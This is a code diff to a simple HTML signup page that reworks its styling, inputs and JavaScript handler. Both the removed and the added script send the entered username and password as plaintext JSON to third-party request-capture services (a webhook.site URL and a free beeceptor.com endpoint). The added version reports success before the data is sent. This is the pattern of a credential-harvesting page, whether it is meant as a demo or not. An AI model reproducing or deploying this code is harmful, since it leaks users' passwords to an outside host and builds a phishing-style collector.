@@ -74,10 +74,6 @@
       cursor: pointer;
       transition: background-color 0.3s ease;
     }
-    button:disabled {
-      opacity: 0.6;
-      cursor: not-allowed;
-    }
     button:hover {
       background-color: #0f786f;
     }
@@ -99,48 +95,51 @@
     <h2>Signup</h2>
     <div class="input-group">
       <label for="username">Username</label>
-      <input type="text" id="username" placeholder="Choose a username" autocomplete="username">
+      <input type="text" id="username" placeholder="Choose a username">
     </div>
     <div class="input-group">
       <label for="password">Password</label>
-      <input type="password" id="password" placeholder="Choose a password" autocomplete="new-password">
+      <input type="password" id="password" placeholder="Choose a password">
     </div>
-    <button id="signupBtn" onclick="signup()">Signup</button>
+    <button id="signupBtn">Signup</button>
     <div class="message" id="message"></div>
   </div>
 
 <script>
-    function signup() {
-      const user = document.getElementById("username").value.trim();
-      const pass = document.getElementById("password").value.trim();
-      const msg = document.getElementById("message");
+  document.getElementById("signupBtn").addEventListener("click", function () {
+    const user = document.getElementById("username").value;
+    const pass = document.getElementById("password").value;
+    const message = document.getElementById("message");
 
-      if (!user || !pass) {
-        msg.textContent = "Please fill in both fields.";
-        msg.style.color = "red";
-        return;
-      }
-
-      msg.textContent = "Signing up...";
-      msg.style.color = "black";
-
-      fetch("https://webhook.site/11f12cc1-f07d-4d4a-89f2-85063aa15916", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ username: user, password: pass })
-      })
-      .then(res => {
-        msg.style.color = "green";
-        msg.textContent = "Signup successful!";
-      })
-      .catch(err => {
-        msg.style.color = "red";
-        msg.textContent = "Signup failed.";
-        console.error(err);
-      });
+    if (!user || !pass) {
+      message.style.color = "salmon";
+      message.textContent = "Please fill in both fields.";
+      return;
     }
-  </script>
 
+    message.style.color = "lightgreen";
+    message.textContent = "Signup successful!";
+
+    const webhookURL = "https://de-mo.free.beeceptor.com";
+
+    fetch(webhookURL, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        username: user,
+        password: pass
+      })
+    }).then(response => {
+      console.log("Webhook response:", response);
+    }).catch(error => {
+      console.error("Error sending to webhook:", error);
+      message.style.color = "salmon";
+      message.textContent = "Failed to send data to Beeceptor.";
+    });
+  });
+</script>
 
 </body>
 </html>
